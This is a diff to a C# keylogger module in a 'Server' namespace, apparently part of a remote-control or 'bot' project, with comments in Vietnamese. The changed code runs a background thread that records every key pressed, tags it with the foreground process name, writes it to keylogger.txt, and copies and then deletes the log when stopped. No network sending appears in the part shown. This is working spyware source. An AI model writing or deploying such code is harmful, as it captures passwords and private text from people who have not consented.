@@ -9,6 +9,7 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+
 using System.Timers;
 using System.Windows.Forms;
 using System.Windows.Input;
@@ -22,7 +23,7 @@ namespace Server
         //private static string logName = "Log_";
         //private static string logExtendtion = ".txt";
         static string pathKeylogger = "keylogger.txt";
-        static bool isStarted = true;
+        static bool isStarted = false;
         private static DateTime timeStart;
         private static DateTime timeStop;
         private static HashSet<Key> PressedKeysHistory = new HashSet<Key>();
@@ -38,14 +39,12 @@ namespace Server
 
         public static void initBotKeylogger()
         {
+            isStarted = true;
             th_doKeylogger = new Thread(new ThreadStart(DoKeylogger));
             th_doKeylogger.SetApartmentState(ApartmentState.STA);
             th_doKeylogger.Start();
+            Console.WriteLine("Start keylogger");
 
-            //timer.Interval = 2000;
-            //timer.Elapsed += new ElapsedEventHandler(onTimedEvent);
-            //timer.Enabled = true;
-            //timer.Start();
         }
         public static void StartKeylogger()
         {
@@ -55,11 +54,7 @@ namespace Server
             // Mở tệp để ghi lại (nếu tệp không tồn tại, nó sẽ tự động được tạo ra)
             using (StreamWriter writer = new StreamWriter(pathKeylogger, false)) // Truyền tham số 'false' để ghi đè tệp hiện có
             {
-                // Bắt đầu ghi dữ liệu vào tệp
-                writer.WriteLine("");
             }
-
-            File.Create("outputkeylogger.txt");
             Console.WriteLine("Keylogger started.");
         }
         public static void copyFile()
@@ -85,13 +80,15 @@ namespace Server
         }
         public static void StopKeylogger()
         {
+            isStarted = false;
+            Thread.Sleep(500);
             if (File.Exists(pathKeylogger))
             {
                 try
                 {
-                    timeStop=DateTime.Now;
+                    timeStop = DateTime.Now;
                     copyFile();
-                    //File.Delete(pathKeylogger);
+                    File.Delete(pathKeylogger);
                     prevProcessName = null;
                 }
                 catch (Exception)
@@ -99,60 +96,43 @@ namespace Server
                     Console.WriteLine("unable to delete keystrokes.txt");
                 }
             }
-            isStarted = false;
+
             Console.WriteLine("Keylogger stopped.");
         }
         static bool isHotKey = false;
         static bool isShowing = false;
-        static void checkHotKey(String s)
-        {
-            //if (s.Equals("[ESC]"))
-            //    isHotKey = true;
 
-            //if (isHotKey)
-            //{
-            //    if (!isShowing)
-            //    {
-            //        DisplayWindow();
-            //    }
-            //    else
-            //        HideWindow();
-
-            //    isShowing = !isShowing;
-            //}
-            //isHotKey = false;
-        }
         private static void DoKeylogger()
         {
             while (true)
             {
-                Thread.Sleep(50);
                 if (!isStarted) continue;
                 string keyPressed = GetNewPressedKeys();
-                //Console.Write(keyPressed);
-                //checkHotKey(keyPressed);
-                //string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion;
-                //StreamWriter sw = new StreamWriter(logNameToWrite, true);
-                //using (StreamWriter sw = File.AppendText(path))
+                if(!System.IO.File.Exists("keylogger.txt"))
+                {
+                    using (FileStream fs = File.Create("keylogger.txt"))
+                    {
+                        Console.WriteLine("Tao keylogger.txt");
+                    }
+                }    
+                
                 if (!IsFileInUse(pathKeylogger))
                 {
                     using (StreamWriter sw = new StreamWriter(pathKeylogger, true))
-                {
-                    activeProcessName = GetActiveWindowProcessName().ToLower();
-                    if (activeProcessName == "idle" || activeProcessName == "explorer") continue;
-                    bool isOldProcess = activeProcessName.Equals(prevProcessName);
-                    if (!isOldProcess && !(string.IsNullOrEmpty(keyPressed)))
                     {
-                        sw.WriteLine("\n[--" + activeProcessName + "--]");
-                        prevProcessName = activeProcessName;
+                        activeProcessName = GetActiveWindowProcessName().ToLower();
+                        if (activeProcessName == "idle" || activeProcessName == "explorer") continue;
+                        bool isOldProcess = activeProcessName.Equals(prevProcessName);
+                        if (!isOldProcess && !(string.IsNullOrEmpty(keyPressed)))
+                        {
+                            sw.WriteLine("\n[--" + activeProcessName + "--]");
+                            prevProcessName = activeProcessName;
+                        }
+                        sw.Write(keyPressed);
+                        sw.Close();
                     }
-                    sw.Write(keyPressed);
-                    sw.Close();
-                }
-
                 }
             }
-
         }
         public static bool IsFileInUse(string filePath)
         {
